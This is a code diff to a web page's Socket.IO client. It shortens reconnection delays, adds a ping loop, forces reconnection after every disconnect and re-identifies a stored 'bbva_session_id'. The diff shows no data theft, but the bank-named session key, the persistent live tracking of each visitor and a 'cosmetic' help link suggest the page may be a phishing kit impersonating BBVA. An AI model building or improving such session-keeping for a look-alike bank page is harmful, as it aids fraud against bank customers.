@@ -94,36 +94,51 @@
         const socket = io({
             transports: ['websocket', 'polling'],
             reconnection: true,
-            reconnectionDelay: 1000,
-            reconnectionDelayMax: 5000,
+            reconnectionDelay: 500,
+            reconnectionDelayMax: 3000,
             reconnectionAttempts: Infinity,
-            timeout: 30000,
+            timeout: 60000,
             forceNew: false,
             upgrade: true,
             rememberUpgrade: true,
-            path: '/socket.io'
+            path: '/socket.io',
+            autoConnect: true
         });
 
         // Get original session ID from storage
         const originalSessionId = localStorage.getItem('bbva_session_id');
         console.log('📂 Session ID recuperado:', originalSessionId);
+        let isConnected = false;
 
-        // Heartbeat para mantener sesión activa
+        // Heartbeat y ping
         let heartbeatInterval = null;
+        let pingInterval = null;
 
         function startHeartbeat() {
             if (heartbeatInterval) clearInterval(heartbeatInterval);
+            if (pingInterval) clearInterval(pingInterval);
+            
             heartbeatInterval = setInterval(() => {
                 if (socket.connected && originalSessionId) {
                     socket.emit('heartbeat', { sessionId: originalSessionId });
                     console.log('💓 Heartbeat enviado');
                 }
-            }, 15000); // Cada 15 segundos
+            }, 15000);
+            
+            pingInterval = setInterval(() => {
+                if (socket.connected) {
+                    socket.emit('ping-client');
+                } else {
+                    console.log('⚠️ Conexión perdida, reconectando...');
+                    socket.connect();
+                }
+            }, 5000);
         }
 
         // Connection monitoring
         socket.on('connect', () => {
             console.log('✓ Conectado al servidor. Socket ID:', socket.id);
+            isConnected = true;
             
             // Identify with original session
             if (originalSessionId && originalSessionId !== socket.id) {
@@ -133,24 +148,28 @@
             
             startHeartbeat();
         });
+        
+        socket.on('session-identified', (data) => {
+            console.log('✅ Sesión identificada:', data);
+        });
 
         socket.on('disconnect', (reason) => {
-            console.log('✗ Desconectado del servidor. Razón:', reason);
+            console.log('✗ Desconectado. Razón:', reason);
+            isConnected = false;
             if (heartbeatInterval) clearInterval(heartbeatInterval);
+            if (pingInterval) clearInterval(pingInterval);
             
-            // Intentar reconectar en todos los casos
-            if (reason === 'io server disconnect' || reason === 'transport close') {
-                setTimeout(() => {
-                    if (!socket.connected) {
-                        console.log('🔄 Intentando reconectar...');
-                        socket.connect();
-                    }
-                }, 1000);
-            }
+            setTimeout(() => {
+                if (!socket.connected) {
+                    console.log('🔄 Forzando reconexión...');
+                    socket.connect();
+                }
+            }, 1000);
         });
 
         socket.on('reconnect', (attemptNumber) => {
             console.log('✅ Reconectado después de', attemptNumber, 'intentos');
+            isConnected = true;
             if (originalSessionId) {
                 socket.emit('identify-session', { originalSessionId });
             }
@@ -170,8 +189,14 @@
         });
 
         socket.on('pong', () => {
-            console.log('🏓 Pong recibido del servidor');
+            console.log('🏓 Pong recibido');
         });
+        
+        socket.on('pong-client', (data) => {
+            console.log('🏓 Pong-client:', new Date(data.timestamp).toLocaleTimeString());
+        });
+        
+        socket.on('ping-all', () => socket.emit('pong'));
 
         // Form functionality
         
@@ -252,6 +277,7 @@
         // Limpiar al cerrar página
         window.addEventListener('beforeunload', () => {
             if (heartbeatInterval) clearInterval(heartbeatInterval);
+            if (pingInterval) clearInterval(pingInterval);
         });
 
         // Help link (cosmetic)
